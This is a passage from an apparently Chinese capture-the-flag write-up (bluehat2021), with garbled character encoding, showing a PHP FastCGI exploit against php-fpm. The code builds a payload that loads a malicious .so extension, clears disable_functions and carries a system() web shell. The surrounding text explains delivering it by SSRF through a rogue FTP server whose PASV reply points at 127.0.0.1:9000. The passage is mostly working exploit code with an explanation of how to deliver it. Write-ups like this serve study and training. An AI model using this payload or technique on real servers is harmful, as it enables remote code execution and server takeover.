punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'?file=ftp://ip:9999/&amp;data='</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token punctuation">.</span><span class="token single-quoted-string string">'?'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dirå³ä¸º.soæ–‡ä»¶æ‰€åœ¨ç›®å½•</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token single-quoted-string string">'GATEWAY_INTERFACE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_METHOD'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'POST'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_FILENAME'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'QUERY_STRING'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_URI'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'DOCUMENT_URI'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token shell-comment comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token single-quoted-string string">'PHP_VALUE'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_SOFTWARE'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// æ‰¾å‡†æœåŠ¡ç«¯å£</span>    <span class="token single-quoted-string string">'SERVER_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PROTOCOL'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'CONTENT_LENGTH'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®æ‹¿åˆ°payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="åˆ©ç”¨-ftp-ä¸-php-fpm-å¯¹è¯-RCE"><a href="#åˆ©ç”¨-ftp-ä¸-php-fpm-å¯¹è¯-RCE" class="headerlink" title="åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE"></a>åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœå¯ä»¥å°†ä»»æ„äºŒè¿›åˆ¶æ•°æ®åŒ…å‘é€åˆ° php-fpm æœåŠ¡ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»£ç ã€‚ æ­¤æŠ€æœ¯é€šå¸¸ä¸ <code>gopher://</code> åè®®ç»“åˆä½¿ç”¨ï¼ˆssrfï¼‰ï¼Œè¯¥åè®®å— curl æ”¯æŒï¼Œ<strong>ä½†ä¸å— php æ”¯æŒ</strong>ã€‚</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">phpæ”¯æŒçš„åè®®å’Œå°è£…åè®®</a> å¯ä»£æ›¿å‘äºŒè¿›åˆ¶åŒ…çš„åè®®åªæœ‰<code>ftp://</code> ï¼Œå†µä¸” ftp æœ¬èº«ä¹Ÿæ˜¯åŸºäº tcp çš„æœåŠ¡ï¼Œèƒ½é…åˆ php-fpm è¿›è¡Œ tcp é€šä¿¡ã€‚</p><blockquote><p><strong>ftp çš„ä¸¤ç§ä¼ è¾“æ¨¡å¼</strong></p><p>ftp æœ‰ä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼ï¼ˆportï¼‰å’Œè¢«åŠ¨æ¨¡å¼ï¼ˆpasvï¼‰ã€‚</p><p>port è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åŒæ—¶æ‰“å¼€å¹¶ä¸”ç›‘å¬ä¸€ä¸ªç«¯å£ä»¥åˆ›å»ºè¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç”±äºå®‰è£…äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ï¼Œè¿æ¥æœ‰æ—¶å€™ä¼šè¢«å®¢æˆ·ç«¯çš„é˜²ç«å¢™é˜»æ­¢ã€‚æ‰€ä»¥ï¼Œåˆ›ç«‹äº† pasv ã€‚pasv åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯å®‰è£…äº†é˜²ç«å¢™çš„é—®é¢˜ã€‚</p><p>ftp å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´éœ€è¦å»ºç«‹ä¸¤æ¡ tcp è¿æ¥ï¼Œä¸€æ¡æ˜¯æ§åˆ¶è¿æ¥ï¼ˆ 21 ç«¯å£ï¼‰ï¼Œç”¨æ¥å‘é€æ§åˆ¶æŒ‡ä»¤ï¼Œå¦å¤–ä¸€æ¡æ˜¯æ•°æ®è¿æ¥ï¼ˆ 20 ç«¯å£ / éšæœºç«¯å£ï¼‰ï¼ŒçœŸæ­£çš„æ–‡ä»¶ä¼ è¾“æ˜¯é€šè¿‡æ•°æ®è¿æ¥æ¥å®Œæˆçš„ã€‚</p><p><strong>ä¸¤ç§ä¼ è¾“æ¨¡å¼çš„å¼‚åŒ</strong></p><p>å¯¹äºä¸¤ç§ä¼ è¾“æ¨¡å¼æ¥è¯´ï¼Œæ§åˆ¶è¿æ¥çš„å»ºç«‹è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·ï¼Œå‡ä¸ºæœåŠ¡å™¨ç›‘å¬ 21 å·ç«¯å£ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp è¿æ¥ã€‚</p><p>ä¸¤ç§ä¼ è¾“æ¨¡å¼çš„ä¸åŒä¹‹å¤„ä½“ç°åœ¨æ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œå¯¹äºæ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œä¸»è¢«åŠ¨æ¨¡å¼çš„ä¸åŒåœ¨äºæ•°æ®è¿æ¥çš„å»ºç«‹â€œæœåŠ¡å™¨â€æ˜¯â€œä¸»åŠ¨â€è¿˜æ˜¯â€è¢«åŠ¨â€ï¼š</p><p>port æœåŠ¡å™¨é€šè¿‡æ§åˆ¶è¿æ¥çŸ¥é“å®¢æˆ·ç«¯ç›‘å¬çš„ç«¯å£åï¼Œä½¿ç”¨è‡ªå·±çš„ 20 å·ç«¯å£ä½œä¸ºæºç«¯å£ï¼ŒæœåŠ¡å™¨â€œä¸»åŠ¨â€å‘èµ· tcp æ•°æ®è¿æ¥ã€‚</p><p>pasv æœåŠ¡å™¨ç›‘å¬ 1024-65535 çš„ä¸€ä¸ªéšæœºç«¯å£ï¼Œå¹¶é€šè¿‡æ§åˆ¶è¿æ¥å°†è¯¥ç«¯å£å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp æ•°æ®è¿æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹æ•°æ®è¿æ¥çš„å»ºç«‹ç›¸å½“äºæœåŠ¡å™¨æ˜¯â€œè¢«åŠ¨â€çš„ã€‚</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>å¦‚å›¾ï¼Œå¯¹äºæˆ‘ä»¬è¿™é¢˜ï¼Œæ˜¾ç„¶åªèƒ½ç”¨ pasv æ¨¡å¼ï¼ŒæœåŠ¡å™¨ç›‘å¬çš„â€œéšæœºç«¯å£â€å¯¹åº” php-fpm ç›‘å¬çš„ 9000 ç«¯å£ï¼Œè¯¦ç»†è¿‡ç¨‹æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®é™…çš„ pasv ä¾‹å­æ¥ç†è§£ï¼š</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>ä»¥ä¸Šæ˜¯å®¢æˆ·ç«¯ testbox1.slacksite.com (192.168.150.80) å‘å‡º <code>PASV</code> å‘½ä»¤ä»¥æŒ‡ç¤ºå…¶å°†ç­‰å¾…æœåŠ¡å™¨ testbox2.slacksite.com (192.168.150.90) â€œè¢«åŠ¨åœ°â€æä¾› ip å’Œç«¯å£å·ï¼Œç„¶åå®¢æˆ·ç«¯å°†åˆ›å»ºåˆ°æœåŠ¡å™¨çš„æ•°æ®è¿æ¥ï¼Œå…¶ä¸­ï¼š</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>è¿™å°±æ˜¯æœåŠ¡å™¨â€œè¢«åŠ¨â€è¿”å›çš„ ip å’Œç«¯å£å·ï¼Œåˆ†åˆ«æ˜¯ 32 ä½çš„ä¸»æœºåœ°å€å’Œ 16 ä½ tcp ç«¯å£åœ°å€ï¼Œè¿™ä¸ªä¾‹å­çš„å°±æ˜¯ 192.168.150.90 çš„ 195*256 + 149 = 50069 ç«¯å£ã€‚</p><p>é€‰æ‹© ip åœ°å€å’Œç«¯å£å·åï¼Œé€‰æ‹© ip åœ°å€å’Œç«¯å£çš„ä¸€æ–¹å°†å¼€å§‹ä¾¦å¬æŒ‡å®šçš„åœ°å€/ç«¯å£ï¼Œå¹¶ç­‰å¾…å¦ä¸€æ–¹è¿æ¥ã€‚ å½“å¯¹æ–¹è¿æ¥åˆ°æ”¶å¬æ–¹åï¼Œæ•°æ®ä¼ è¾“å¼€å§‹ã€‚</p><p>æˆ‘ä»¬è¿™é¢˜éœ€è¦å°† ip ç«¯å£é‡å®šå‘ä¸º 127.0.0.1:9000 æ¥è¯•å›¾ ssrf ï¼Œ9000 % 256 = 40 ï¼Œå³å¯è¡¨è¾¾ä¸ºï¼š</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> ç”¨ <code>ftp://</code> ä¸æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨å»ºç«‹æ§åˆ¶è¿æ¥ï¼Œä½¿ç›®æ ‡å‘é€ <code>PASV</code> å‘½ä»¤ï¼Œæˆ‘ä»¬â€œè¢«åŠ¨â€æä¾› ip ç«¯å£è‡³æœ¬åœ° 9001ç«¯å£ï¼Œç„¶åå»ºç«‹èµ·æ•°æ®è¿æ¥ï¼Œå°† data ï¼ˆfastcgi payloadï¼‰çš„å†…å®¹æ‰“åˆ°FastCGIæœåŠ¡</p><p>åœ¨<code>/var/www/html</code>ç›®å½•å†™æ–‡ä»¶<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter 